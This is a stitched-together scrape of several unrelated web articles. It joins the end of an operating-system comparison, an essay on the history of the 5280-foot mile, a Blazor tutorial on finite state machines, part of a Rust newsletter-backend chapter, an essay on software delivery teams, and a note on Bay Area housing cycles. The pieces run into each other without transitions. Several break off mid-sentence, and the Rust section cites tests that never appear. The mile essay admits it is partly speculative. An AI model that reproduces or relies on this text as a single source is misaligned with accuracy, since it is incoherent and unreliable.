costs a lot of money if obtained legally, especially if you want the better versions with more security features and such, and 
is a privacy nightmare out of the box, some of which cannot be disabled in the non-Enterprise/Education versions.</p>
<h2>Qubes OS</h2>
<p><a href="https://www.qubes-os.org/">Qubes OS</a> is actually one of my favorites, and it is what I used to write this post. It has a 
great desktop security model based on isolating different programs into different VMs, good hardware compatibility due to the 
use of a Linux kernel for drivers, and allows you to run instances of the same program isolated from each other (something 
that other systems mentioned here mostly cannot, at least not as easily). It …</p></article></div></div>

The modern mile was defined as 5280 feet under Queen Elizabeth at the end of the 16th century in order to reconcile multiple discordant measurement systems already in wide use. In particular, it was convenient to make it an even multiple of the sides of an acre, which since early medieval times was a rectangle 660 feet long and 66 feet wide. 660 divides neatly into 5280, eight ways, allowing a square mile (640 acres or a “section”) to be conveniently quartered three times over: into quarter sections (160 acres), sixteenth sections (40 acres), and finally the 10 acre squares (660 by 660 feet) that remain at the base of all US land surveys to this day.</p>

<p><em>Background: Many years ago, I became curious as to why, exactly, there are 5280 feet in a mile. The explanations I found online at the time weren’t very convincing. At the time I tried to make some fixes to parts of the puzzle in Wikipedia, but they frequently rejected as OR (original research). Eventually I wrote this article, since revised and updated several times. Since then, my “version” of things will occasionally drift to the #1 spot on Google or Bing, or both, when answering the specific question “why are there 5280 feet in a mile”. More often some SEO-optimized version will slip ahead, though it seems this article is holding steady in the top 3 or 4 at least. So hopefully pretty much everybody who cares about the details will find this. If you have any comments or questions (or corrections), please add to the comment section, I do (eventually) read all comments.<br>
</em></p>
<p><em>I have yet to find an answer to the question that’s as thorough and complete as this one is. But I must caution that this article isn’t really up to academic standards and contains a non-trivial amount of speculation. Caveat Emptor, what follows is my theory of how the mile ended up with 5280 feet.</em></p>
<p>The conventional wisdom on this topic goes something like this: the mile was originally 5000 feet. It was changed to 5280 feet in Elizabethan times around the year 1600 (some point to 1592 and some to 1593) to accommodate the furlong, which was 660 feet. It was easier to fix the mile rather than the furlong for various reasons, hence, eight furlongs and 5280 feet in a mile.</p>
<p>That’s the standard story. It’ll be fleshed out with bells and whistles, including odd theories about horses etc, but that’s about it.</p>
<p>The problem with these versions is that they don’t explain why this collision between furlong and mile occurred around 1600, and not centuries before. It implies, therefore, that people suddenly woke up and realized, hey, wait a second, if there’s 660 feet in a furlong … and eight furlongs in a mile … but 5000 feet in a mile …. wait a second !?!</p>
<p>It somewhat implies that four-digit multiplication was invented ca 1600. Like a lot of rear-view-mirror takes on history, the “explanation” boils down to: “before time X people were stupid about topic Y, and at time Z they wizened up.”</p>
<p>Failing to find a good write-up of the origins, I’ve pieced together my own theory over the years. And it’s a fun one because the answer (or rather, hypothesis) is simply this: the number 5280 arises out of a collision between organized religion, the military, and taxation. Three powerful historical forces, to be sure, so the fourth pillar to modern society (rationality) obviously has to be the one to compromise!</p>
<p>But wait, there’s more: naked Greeks are involved, and Jesus, and Vikings. In that order.</p>
<p>Our story starts with the “original” mile, the Roman one (though there is indication the measurement is older still). The Romans were both practical and militant. Their mile was 1000 paces – a pace being a double step (left foot, right foot) by a soldier in full battle gear. That was a “<em>passus</em>“, and a mile was a “<em>milia passuum</em>“, hence the word “mile” (for “thousand”, as in the word <em>millennium)</em>.</p>
<p>If you are a runner or a hiker, you’ll know that we still remember this information in our convention of relating pedometers to miles: about 2000 steps to a mile. But we have forgotten that it’s not a “trick”, it’s the whole point. Language use changes back and forth over time, and today we’re more likely to use the word “step” rather than “pace”, hence, we can think of a mile as being defined as 2000 steps.</p>
<p>Furthermore, the Romans had another convention, that you’ve probably heard of, which was to place stones next to their roads to mark the distance from Rome. Called “<em>milliarium</em>“, these stone obelisks were first erected along the Via Appia, where milestones dating as far back as the second century BC still survive. Naturally, quite a large number of these stones survived along roads throughout Europe, providing a natural reference point, explaining why their particular measure of a “foot” survives with high accuracy. The central stone in Rome, from which the phrase “all roads lead to Rome” derives, wasn’t erected until some two centuries later in 20 BC, but is since lost.</p>
<p>It’s worth injecting that the popular notion that Roman roads all had measures of the distance from Rome is a myth: only central Italy and a few exceptions were marked from central Rome, all other roads were measured from the nearest local significant center. The US’ attempt to replicate this myth with the Zero Mile marker in Washington, DC, in 1792 would have a similar destiny, influencing only measurements nearby. Instead a similar variation (measuring from something local and significant) lives on in the mile markers of the interstate highway system, where the numbering typically starts at either the southern or the western state line and increasing as you drive in the other direction.</p>
<p>Curiously, we know very little of the details of how the Roman army used the mile as a practical tool – not a single significant military treatise has survived from Roman times. The that has, the <em>Epitoma rei militaris,</em> is unfortunately not considered authoritative. Thus its claims cannot be checked against any other contemporary sources, which is particularly irksome since some of them appear highly dubious – such as stating that the army marched 20 miles in 5 summer hours at regular pace and 24 miles at double pace.</p>
<p>You can experiment yourself to realize that the miles per hour measure is practical for a human: casual walking is 2 mph, an easy walk is 3, swift walking is 4. The available number of hours in a day is similarly small, thus making the mental arithmetic simple.</p>
<p>Hence, 5000 feet to the mile, a general measure that survived throughout Europe as roadside reminders of the might of Rome.</p>
<p>Now, switching tracks, about the furlong. It means “a furrow long” (long as a furrow) and is a practical measure in an agrarian society: it is (approximately) the distance an oxen can plow without resting. That distance was standardized to be 40 “rods”, where a rod (or “pole”) is today defined as 5.5 yards (16.5 feet), though it was probably originally 20 feet (we’ll get back to all this).</p>
<p>An “acre” (which means “field”) was 40 rods long and 4 rods wide (4 rods was also called a “chain”, more on that below). An acre was thus the surface area that one man and a team of oxen could till in one day. It was long and narrow because of the development of the heavy plough around the end of the 10th century, which turned the soil over, revolutionizing agriculture in northern Europe where the clay-heavy soil (vs sandier south European soil) went from being a handicap to an asset, in fact contributing significantly to the eventual inversion of economic power in Europe from the south to the north.</p>
<p>At this point, if you’re paying close attention, you’ll see that not only do we have the decimal (base 10) concept in the “mile” (one thousand paces), but also in the acre: the proportions of the sides are exactly 10:1. That’s because “acre” dates back to “10 square chains”, or an area that’s one “chain” wide and ten long. A “chain” in turn is four rods. The word “chain” comes from how this convenient measurement tool was constructed. Organic materials (wood, rope) have obvious problems in retaining precise dimensions, despite efforts to wax or otherwise treat them. A marked improvement therefore came from carrying a set of thin metal rods, that eventually would be “chained” together. Most surveying in the United States was done in the 1700s and 1800s using a standardized 100-link chain of 66 feet in total length.</p>
<p>But this was a more modern innovation. Going much further back in history it seems likely the basic approach was instead to carry a long, thin, metal “rod” that was 16 feet long, seems likely to me that they were in parts. This is still today a common surveying tool – search Amazon for “surveyor rod” and you’ll find the modern version, now made of telescoping aluminum and generally 16 feet long. We’ll get back to why it was 16 feet (and not 10 or 20), and how it later on became 16.5.</p>
<p>This tradition of the furlong (ten chains) took root in England between the fall of Rome and the Norman conquest of 1066, along the aforementioned adoption of heavy ploughs. With the Normans came the re-introduction of the Roman definition of the foot as 12 inches. A reference foot was thusly carved into one of the pier bases of the new nave in St Paul’s cathedral in London in 1104 (by the son of a banker, interestingly enough).</p>
<p>The Saxon tradition of measuring land had been established in terms of rods, and as we alluded above, probably based on 20 “natural” feet – i.e. not Roman standard feet but “real” 9.8-inch feet. The number 20, of course, was the common “decimal” system prior to the invention of shoes (at which point you can’t see your toes). Also, the technique of counting to 20 with one hand may have been prevalent. Vestiges of base-20 remain, notably for our story, in Danish and French. For example, in French you say “soixante-dix” for 70 and in Danish you say …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>Hi everyone! Welcome back to part 8 of our <strong>Blazor 2d Gamedev</strong> series. Today we’ll keep refactoring <a href="https://www.davideguida.com/blazor-gamedev-part-8-keyboard-control-animations/" target="_blank" rel="noreferrer noopener">our last example</a>, cleaning up the code using a <strong>Finite State Machine</strong>.</p>



<p>As usual, you can check out the <a href="https://mizrael.github.io/BlazorCanvas/BlazorCanvas.Example8/" target="_blank" rel="noreferrer noopener">results in your browser</a> before moving on. Use left/right arrows to move the player and the space bar to attack.</p>



<h4>So, what’s a <strong>Finite State Machine</strong>? It’s a computational machine, built from a finite list of states and the list of transitions between them. </h4>



<p>An <strong>FSM </strong>can be exactly in only one of the states and can (possibly) transition into another one after receiving some particular input. This input can be state-specific or global. For more details, check out <a rel="noreferrer noopener" target="_blank" href="https://en.wikipedia.org/wiki/Finite-state_machine">the excellent article</a> on Wikipedia, it will give for sure a lot of food for thoughts.</p>



<p>Now, how can an <strong>FSM</strong> help us with our game? In a lot of ways actually. The first scenario is getting rid of all those nasty <em>if/else</em> blocks:</p>



<pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public override async ValueTask Update(GameContext game)
{
	var right = InputSystem.Instance.GetKeyState(Keys.Right);
	var left = InputSystem.Instance.GetKeyState(Keys.Left);

	if (right.State == ButtonState.States.Down)
	{
		_transform.Direction = Vector2.UnitX;
		_animationComponent.Animation = _animationsSet.GetAnimation("Run");
	}
	else if (left.State == ButtonState.States.Down)
	{
		_transform.Direction = -Vector2.UnitX;
		_animationComponent.Animation = _animationsSet.GetAnimation("Run");
	}
	else if (right.State == ButtonState.States.Up)
		_animationComponent.Animation = _animationsSet.GetAnimation("Idle");
	else if (left.State == ButtonState.States.Up)
		_animationComponent.Animation = _animationsSet.GetAnimation("Idle");
}</pre>



<p>If you remember from our last article, that’s the code handling the animation switching. We’re going to replace that entirely with an <strong>FSM</strong>.</p>



<p>The idea is to have a State for each possible animation of our character (“idle”, “running”, “attack” and so on). Then we’ll define the possible transitions between them. A transition occurs when a specific condition is detected: for example, if we’re <em>idle</em> and our speed is &gt; 0.1 then we transition to “running”.</p>



<p>At every update cycle, the current State will loop the list of its transactions and check the conditions for each one. If one of the predicates is satisfied, the transition occurs. We might even decide to get fancy and assign a weight to the transitions: this way if multiple predicates are true, we’ll pick the one with the highest weight.</p>



<p>Let’s take a look at the code now. This is the <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example8/Core/Components/AnimationState.cs" target="_blank" rel="noreferrer noopener">AnimationState</a> <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example8/Core/Components/AnimationState.cs" target="_blank" rel="noreferrer noopener">class</a>:</p>



<pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class AnimationState
{
	private readonly List&lt;Transition&gt; _transitions;
	private readonly AnimationCollection.Animation _animation;

	public async ValueTask Update(AnimationController controller)
	{
		var transition = _transitions.FirstOrDefault(t =&gt; t.Check(controller));
		if(null != transition)
			controller.SetCurrentState(transition.To);
	}

	public void Enter(AnimatedSpriteRenderComponent animationComponent) =&gt;
		animationComponent.Animation = _animation;
}</pre>



<p>The Transition class instead looks more or less like this:</p>



<pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class Transition
{
	private readonly IEnumerable&lt;Func&lt;AnimationController, bool&gt;&gt; _conditions;

	public Transition(AnimationState to, IEnumerable&lt;Func&lt;AnimationController, bool&gt;&gt; conditions)
	{
		To = to;
		_conditions = conditions ?? Enumerable.Empty&lt;Func&lt;AnimationController, bool&gt;&gt;();
	}

	public bool Check(AnimationController controller)
	{
		return _conditions.Any(c =&gt; c(controller));
	}

	public AnimationState To { get; }
}</pre>



<p>As you can see, the list of conditions is a collection of predicates, accepting as input an instance of the <a href="https://github.com/mizrael/BlazorCanvas/blob/develop/BlazorCanvas.Example8/Core/Components/AnimationController.cs" target="_blank" rel="noreferrer noopener">AnimationController class</a>, which represents our FSM:</p>



<pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public class AnimationController : BaseComponent
{
	private readonly IList&lt;AnimationState&gt; _states;
	private AnimationState _defaultState;
	private AnimationState _currentState;
	private readonly AnimatedSpriteRenderComponent _animationComponent;
	private readonly IDictionary&lt;string, float&gt; _floatParams;
	private readonly IDictionary&lt;string, bool&gt; _boolParams;

	public AnimationController(GameObject owner) : base(owner)
	{
		_states = new List&lt;AnimationState&gt;();
		_animationComponent = owner.Components.Get&lt;AnimatedSpriteRenderComponent&gt;() ??
							  throw new ComponentNotFoundException&lt;AnimatedSpriteRenderComponent&gt;();

		_floatParams = new Dictionary&lt;string, float&gt;();
		_boolParams = new Dictionary&lt;string, bool&gt;();
	}


	public void AddState(AnimationState state)
	{
		if (!_states.Any())
			_defaultState = state;
		_states.Add(state);
	}

	public override async ValueTask Update(GameContext game)
	{
		if (null == _currentState)
		{
			_currentState = _defaultState;
			_currentState.Enter(_animationComponent);
		}

		await _currentState.Update(this);
	}

	public void SetCurrentState(AnimationState state)
	{
		_currentState = state;
		_currentState?.Enter(_animationComponent);
	}

	public float GetFloat(string name) =&gt; _floatParams[name];

	public void SetFloat(string name, float value)
	{
		if(!_floatParams.ContainsKey(name))
			_floatParams.Add(name, 0f);
		_floatParams[name] = value;
	}

	public void SetBool(string name, in bool value)
	{
		if (!_boolParams.ContainsKey(name))
			_boolParams.Add(name, false);
		_boolParams[name] = value;
	}

	public bool GetBool(string name) =&gt; _boolParams[name];
}</pre>



<p>The <em>AnimationController</em> holds the list of States, plus some <em>custom parameters</em>. We can use those to store some relevant information about the current state of the player. Later on, we can leverage them when creating the transition predicates:</p>



<pre data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">var animationController = new AnimationController(warrior);
animationController.SetFloat("speed", 0f);

var idle = new AnimationState(animationCollection.GetAnimation("Idle"));
animationController.AddState(idle);

var run = new AnimationState(animationCollection.GetAnimation("Run"));
animationController.AddState(run);

idle.AddTransition(run,new Func&lt;AnimationController, bool&gt;[]
{
	ctrl =&gt; ctrl.GetFloat("speed") &gt; .1f
});

run.AddTransition(idle, new Func&lt;AnimationController, bool&gt;[]
{
	ctrl =&gt; ctrl.GetFloat("speed") &lt; .1f
});</pre>



<p>That’s all for today. Next time we’ll see what a Scene Graph is and how we can use it to handle our Game Objects.</p>

<p>It is now time to capitalise on what we learned to finally fulfill the <a href="https://www.lpalmieri.com/posts/2020-06-21-zero-to-production-2-learn-by-building-an-email-newsletter/">first user story of our email newsletter project</a>:</p>

<blockquote>
<p>As a blog visitor,<br>

<p>We expect our blog visitors to input their email address in a form embedded on a web page.<br>
The form will trigger a <code>POST</code> <code>/subscribtions</code> call to our backend API that will actually process the information, store it and send back a response.</p>

<p>We will have to dig into:</p>

<ul>
<li>how to read data collected in a HTML form in <code>actix-web</code> (i.e. how do I parse the request body of a <code>POST</code>?);<br></li>
<li>what libraries are available to work with a PostgreSQL database in Rust (<code>diesel</code> vs <code>sqlx</code> vs <code>tokio-postgres</code>);<br></li>
<li>how to setup and manage migrations for our database;<br></li>
<li>how to get our hands on a database connection in our API request handlers;<br></li>
<li>how to test for side-effects (a.k.a. stored data) in our integration tests;<br></li>
<li>how to avoid weird interactions between tests when working with a database.</li>

<h2 id="2-1-refining-our-requirements">2.1. Refining Our Requirements</h2>

<p>What information should we collect from a visitor in order to enroll them as a subscriber of our email newsletter?</p>

<p>Well, we certainly need their email addresses (it is an <em>email</em> newsletter after all).<br>
What else?</p>

<p>This would usually spark a conversation among the engineers on the team as well as the product manager in your typical business setup. In this case, we are both the technical leads and the product owners so we get to call the shots!</p>

<p>Speaking from personal experience, people generally use throwaway or masked emails when subscribing to newsletters (or, at least, most of you did when <a href="https://www.lpalmieri.com/subscribe/">subscribing to Zero To Production</a>!).<br>
It would thus be nice to collect a <code>name</code> that we could use for our email greetings (the infamous <code>Hey {{subscriber.name}}!</code>) as well as to spot mutuals or people we know in the list of subscribers.<br>
We are not cops, we have no interest in the <code>name</code> field being <em>authentic</em> - we will let people input whatever they feel like using as their identifier in our newsletter system: <a href="https://xkcd.com/979/"><code>DenverCoder9</code></a>, we welcome you.</p>

<p>It is settled then: we want an email address and a name for all new subscribers.</p>

<p>Given that the data is collected via a HTML form, it will be passed to our backend API in the body of a <code>POST</code> request. How is the body going to be encoded?<br>
There are a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST">few options available</a> when using HTML forms: <code>application/x-www-form-urlencoded</code> is the most suitable to our usecase.<br>
Quoting MDN web docs, with <code>application/x-www-form-urlencoded</code></p>

<blockquote>
<p>the keys and values [in our form] are encoded in key-value tuples separated by ‘&amp;‘, with a ‘=’ between the key and the value. Non-alphanumeric characters in both keys and values are percent encoded.</p>
</blockquote>

<p>For example: if the name is <code>Le Guin</code> and the email is <code>ursula_le_guin@gmail.com</code> the <code>POST</code> request body should be <code>name=le%20guin&amp;email=ursula_le_guin%40gmail.com</code> (spaces are replaced by <code>%20</code> while <code>@</code> becomes <code>%40</code> - a reference conversion table can be found <a href="https://www.w3schools.com/tags/ref_urlencode.ASP">here</a>).</p>

<p>To summarise:</p>

<ul>
<li>if a valid pair of name and email is supplied using the <code>application/x-www-form-urlencoded</code> format the backend should return a <code>200 OK</code>;<br></li>
<li>if either name or email are missing the backend should return a <code>400 BAD REQUEST</code>.</li>
</ul>

<p>Now that we understand better what needs to happen, let’s encode our expectations in a couple of integration tests.</p>

<p>Let’s add the new tests to the existing <a href="https://github.com/LukeMathWalker/zero-to-production/blob/master/chapter03-0/tests/health_check.rs"><code>tests/health_check.rs</code> file</a> - we will re-organise our test suite folder structure afterwards.</p>

</div>
<p><code>subscribe_returns_a_400_when_data_is_missing</code> is an example of <a href="https://github.com/golang/go/wiki/TableDrivenTests"><em>table-driven test</em></a> also known as <em>parametrised test</em>.<br>
It is particularly helpful when dealing with bad inputs - instead of duplicating test logic several times we can simply run the same assertion against a collection of known invalid bodies that we expect to fail in the same way.<br>
With parametrised tests it is important to have good error messages on failures: <code>assertion failed on line XYZ</code> is not great if you cannot tell which specific input is broken! On the flip side, that parametrised test is covering a lot of ground so it makes sense to invest a bit more time in generating a nice failure message.<br>
Test frameworks in other languages sometimes have native support for this testing style (e.g. <a href="https://docs.pytest.org/en/stable/parametrize.html">parametrised tests in <code>pytest</code></a> or <a href="https://andrewlock.net/creating-parameterised-tests-in-xunit-with-inlinedata-classdata-and-memberdata/"><code>InlineData</code> in xUnit for C#</a>) - there are a few crates in the Rust ecosystem that extend the basic test framework with similar features, but unfortunately they do not interop very well with the <code>#[actix_rt::test]</code> macro that we need to write asynchronous tests idiomatically (see <a href="https://github.com/la10736/rstest/issues/85"><code>rstest</code></a> or <a href="https://github.com/frondeus/test-case/issues/36"><code>test-case</code></a>).</p>

<p>As expected, all our new tests are failing.<br>
You can immediately spot a limitation of “roll-your-own” parametrised tests: as soon as one test case fails, the execution stops and we do not know the outcome for the following tests cases.</p>

<p>Let’s get started on the implementation.</p>

<h2 id="2-3-parsing-form-data-from-a-post-request">2.3. Parsing Form Data From A <code>POST</code> Request</h2>

<p>All tests are failing because the application returns a <code>404 NOT FOUND</code> for <code>POST</code> requests hitting <code>/subscriptions</code>. Legitimate behaviour: we do not have a handler registered for that path.<br>
Let’s fix it by adding a matching route to our <code>App</code> in <code>src/lib.rs</code>:</p>

<h2>Begin With: Why Do You Need To Build Software?</h2>



<p>There are a many reasons why an organization needs to build and deliver software. Some examples might be:</p>



<ul><li>Grow integrated strategic partnerships</li><li>Improve internal proprietary processes</li><li>Quality assurance and business intelligence</li><li>Build products and tools that customers will use directly</li></ul>



<p>Taking the time to understand the “why” can help you determine how to structure a delivery team and establish long term plans. In many cases an organization may find it has multiple answers to the “why” and this could be a good indicator that a team for each might be a good idea.</p>



<h2>Create Aligned Work Streams vs Functional Groups</h2>



<p><br>Before we can dive into the 4 components that make a delivery team successful, we need to address team structure. For years many organizations structured software development teams by the “how” instead of “why”.&nbsp; For example –&nbsp; QA experts and engineers were divided into groups. I’m sure some of the thought process was to build competency within an organization. Unless you are offering those services directly to customers – your goals shouldn’t be building a stellar “QA” or “Engineering” team. You want a high performing “delivery” teams that just happen to be composed of individuals in these roles. Consider objective first, software creation second. Think diversity of perspectives – putting people with different skill-sets and roles together for a common goal will cultivate continuous improvement.</p>



<h2>The 4 Components</h2>



<p>I’m going to attempt to describe each component and then give examples of ways a team can implement each one. Understand that every organization and workstream may be different – so not all may apply.</p>



<h2><br>Build</h2>



<div><p>Build is traditionally measured by how well your organization can produce technology that can scale, can be maintained cost effectively, and functions consistently.&nbsp; In addition to these considerations I would also include flexibility. A build team that understands how to work iteratively – applying the correct level of technology &amp; effort to deliver what is necessary is key.&nbsp;The ability to produce quality software in a predictable way is the result of multiple aligned efforts.</p><p><strong>Application Portfolio Management &amp; Support:</strong>&nbsp; In order to continue building you have to consider what has been built already. One mistake many organizations make is creating dedicated support teams that are not aligned with a work stream. The result is a disenfranchised team and a pile of technology that eats up resources. A team that doesn’t manage its portfolio will also run into serious tech debt issues – ultimately impacting its ability to deliver. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://spaces.at.internet2.edu/display/itana/TIME+Models" target="_blank">&nbsp;(TIME) Tolerate | Invest | Maintain | Eliminate</a></p></div>



<p><strong>DevOps:</strong> In my mind the greatest contributor to effective delivery is the ability to ship code safely and effortlessly. Thinking back to days when I had to deal with 45 minute builds, complex manual deployment processes, and terrifying testing procedures – this is an easy one in my book. I also believe this is an enabler for organizations with on-prem technology that want to get to the cloud. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://services.google.com/fh/files/misc/state-of-devops-2019.pdf" target="_blank">State Of DevOps (Google)</a></p>



<p><strong>Quality Assurance:</strong> This requires a role that specializes in regression and user acceptance testing. Some of this can also be automated but nothing replaces an individual with domain knowledge that can find bugs. The level of QA necessary for a work stream is dependent on the level of acceptable risk. Ex – financial or healthcare processing will need more QA that a startup still looking for product market fit. <em>Further Reading: </em><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Software_testing_tactics" target="_blank">Software Testing Tactics</a></p>



<p><strong>Software Development: </strong>An obvious component of build – a good development team is critical to executing.&nbsp; Software craftsmanship concepts such as TDD and SOLID are game changers when attempting to deliver high quality software quickly.&nbsp; <em>Further Reading:</em> <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SOLID" target="_blank">SOLID</a><strong> | </strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Test-driven_development" target="_blank">TDD</a></p>



<h2>Learn</h2>



<p>You must inform your build effort, otherwise you will produce technology that is of little value (<a rel="noreferrer noopener" href="https://7samurai.dev/2020/08/24/how-to-deliver-meaningful-software/" data-type="post" data-id="20" target="_blank">meaningless</a>). You do this by growing the collective knowledge of the team. It’s important to understand that one person or one role isn’t solely responsible for this on well functioning teams. Every member should have the freedom to contribute. <strong><p>User Experience Research:</p></strong> This role is an absolute must for product focused work streams.&nbsp; Creation of user personas, qualitative &amp; quantitative research, and structured user interviews are all important if an organization wishes to build products that provide real value. This role also places a high emphasis on creating value by understanding the behaviors and needs of users. <em>Further Reading:</em> <a rel="noreferrer noopener" href="http://www.allaboutux.org/ux-definitions" target="_blank">User Experience Definitions&nbsp;</a></p>



<p><strong>Business Analysis:</strong> While UX focuses on users, BA roles tend to focus on business and process.&nbsp; The type of work stream again determines the importance of this role on the team. Business analysts also tend to retain and build domain knowledge. This can be critical as well if your work stream is heavy on complex business processes. Practices such as process mapping and requirements gathering are extremely valuable when dealing with complex workflows and business needs. <em>Further Reading:</em> <a href="https://www.adb.org/sites/default/files/publication/27641/five-whys-technique.pdf" target="_blank" rel="noreferrer noopener">5 Whys </a><strong>&nbsp;| </strong><a href="https://en.wikipedia.org/wiki/MoSCoW_method" target="_blank" rel="noreferrer noopener">MoSCoW</a></p>



<p><br><strong>Technical Analysis &amp; Design:</strong> Commonly misunderstood or ignored this role is a must have on teams that maintain and enhance large systems or a large number of applications. Sometimes domain knowledge lives within code and the only way to re-discover requires a deep dive into the code.&nbsp; In most cases this needs to be an experienced developer who can translate code into requirements (or at minimum technical specifications). Some organizations attempt to avoid this by producing large volumes of documentation – in many cases it’s not a viable solution.&nbsp; <em>Further Reading:</em> <a href="https://www.mountaingoatsoftware.com/blog/not-everything-needs-to-be-a-user-story-using-fdd-features" target="_blank" rel="noreferrer noopener">Using FDD Features</a></p>



<h2>Promote</h2>



<p>Once you build something you need to ensure that its value is understood by stakeholders and users. I consider this effort one of the 4 pillars because without it you don’t receive feedback or traction. Unused software is meaningless software – even if it “could” offer value. There is strong overlap in this area with general sales and marketing but this is outside the scope of “software delivery”.</p>



<div><p><strong>Demos</strong>: One way you can promote internally is via “Demo Days”. Showing new functionality to stakeholders and team members creates conversations which generates internal feedback loops. This ensures that everyone understands the value. Also, this also offers an opportunity to team members who wish to build communication and speaking skills. <em>Further Reading:</em> <a href="https://dev.acquia.com/blog/how-to-give-a-great-agilescrum-sprint-demo/09/08/2018/19771" target="_blank" rel="noreferrer noopener">How to Give a Great Agile/Scrum Sprint Demo</a></p><p><strong>Roadmaps</strong>:&nbsp; Communicating the direction of the team to the organization is important. Hopefully it can provide a source of excitement and inspiration for the entire organization. A well communicated roadmap in conjunction with a good company culture should result in aligned efforts and a shared vision.&nbsp; <em>Further Reading:</em>&nbsp; <a href="https://docs.google.com/presentation/d/1HReut5aIndOczY3sD6JQhowRIrmp44RcvjnT28mzfBM/edit#slide=id.g23c0d64254_0_16" target="_blank" rel="noreferrer noopener">Department Of Product: Roadmaps</a><br><strong><br>Customer Experience</strong>: Ensuring that customers can easily understand and utilize features the team has created – in conjunction with the offering as a whole ensures that engagement can scale as the product becomes more complex (and/or integrated).&nbsp; I consider this “promotion” because creating a good customer experience is a form of promoting the underlying value provided by the platform.&nbsp; <em>Further Reading:</em> <a href="https://www.nngroup.com/articles/ux-vs-cx/" target="_blank" rel="noreferrer noopener">User Experience vs. Customer Experience</a></p></div>



<h2>Core</h2>



<p>Now we get to the really fun part. Putting it all together. While the other 3 components can vary based on organizational structure and work stream needs – these items are non-negotiable if you wish to successfully deliver meaningful software.</p>



<p><strong>Ownership:&nbsp;</strong> Without strategic direction a team is very likely to focus on small items that don’t line up with larger objectives (although I do think it’s possible for teams to become aligned – a topic for another time). Decision makers need to be responsible for collecting information from all 3 components, weave in considerations from leadership, and set a course. Among the many decisions to be made lies the most critical – platform and feature prioritization.&nbsp; <em>Further Reading:</em> <a href="http://agilemodeling.com/essays/productOwner.htm" target="_blank" rel="noreferrer noopener">A Stakeholder Proxy for Agile Teams</a></p>



<p><strong>Continuous Improvement:</strong>&nbsp; A team that wants to deliver meaningful software must strive to be better on both a team and individual level. The only way this works however is if the team defines and measures continuous improvement goals on its own. An autonomous team that has the freedom to test (and fail) in an effort to improve will produce consistently better results long term. <em>Further Reading:</em> <a href="https://retromat.org/en/?id=43-133-10-73-60" target="_blank" rel="noreferrer noopener">RetroMat</a></p>



<p><strong>Work Agreements:</strong> Informed by continuous improvement, this can include work visualization, code quality practices, ceremonies, definition of done, and other “contracts” among team members. The importance of mutually agreed upon expectations is it removes frustration from the day to day. A good example of this is user stories. A great format for collecting requirements and managing the work – but the real value is its ability to transfer knowledge among multiple team members and roles in a well understood format. Add the ability to visualize priority and progress and the team finds itself aligned. Also keep in mind, while the agreements may be rigid in  definition your continuous improvement efforts should allow for them to change easily when necessary. <em>Further Reading:</em> <a href="https://tech.gsa.gov/guides/Agile_Meetings_Goals_and_Benefits/" target="_blank" rel="noreferrer noopener">Agile Meetings – Goals and Benefits </a>| <a href="https://www.atlassian.com/agile/kanban/kanban-vs-scrum" target="_blank" rel="noreferrer noopener">Kanban vs. Scrum</a></p>

<p>Below is a look at the past 30+ years of San Francisco Bay Area real estate boom and bust cycles. Financial-market cycles have been around for hundreds of years, all the way back to the Dutch tulip mania of the 1600’s. While future cycles will vary in their details, the causes, effects and trend lines are often quite similar. Looking at cycles gives us more context to how the market works over time and where it may be going — much more than dwelling in the immediacy of the present with excitable pronouncements of “The market’s crashing and won’t recover in our lifetimes!” or “The market’s crazy hot and the only place it can go is up!”</p>
<p>Note: Most of these charts generally apply to higher-priced Bay Area housing markets, such as those found in much of San Francisco, Marin, Central Contra Costa (Lamorinda &amp; Diablo Valley) and San Mateo Counties. (Different market price segments had bubbles, crashes – or adjustments – and recoveries of differing magnitudes in the last cycle, which is addressed at the end of this report.)</p>
<p><u>Regardless of how recent cycles have played out, it is vital to understand how extremely difficult it is to predict, with any accuracy, when different parts of a cycle will begin or end.</u>&nbsp;Boom times can go on much longer than expected, or get second winds; recessions or crashes can appear with startling suddenness. It should also be noted that all of the major down cycles in the Bay Area in recent decades have been tied to national or international economic factors, i.e. our cycles aren’t simply local events, separated from the rest of the state or country. However, it is true that local factors sometime exacerbate a downturn (the earthquake of 1989; our greater exposure to the dotcom bubble), or supercharge a recovery (the Bay Area high-tech boom of recent years).</p>

Whatever the phase of the cycle, up or down, while it is going on people think it will last forever. Going up, it’s never going to stop! And then every time the market goes down, the consensus becomes that real estate will not recover for decades (or even “in our lifetimes”). But the economy mends, the population grows, people start families, inflation builds up over the years, and repressed demand of those who want to own their own homes builds up. In the early eighties, mid-nineties and in 2012, after about 4 years of a recessionary housing market, this repressed demand jumped back in (or “explodes” might be a good description) and prices started to rise again. (The dotcom bubble adjustment caused no lasting recession in home values.)</p>
<p>It’s not unusual for a big surge in values to occur in the first couple of years after a recovery begins, often quickly exceeding the previous peak value.</p>
<p>All bubbles are ultimately based on irrational exuberance and/or criminal behavior, whether exemplified by junk bonds, Savings &amp; Loan frauds, dotcom stock hysteria, “Dow 30,000” insanity, “the end of the business cycle” nonsense, gorging on unsustainable debt, runaway greed (without any corresponding desire to produce anything of value), predatory lending, or dishonest financial engineering.</p>
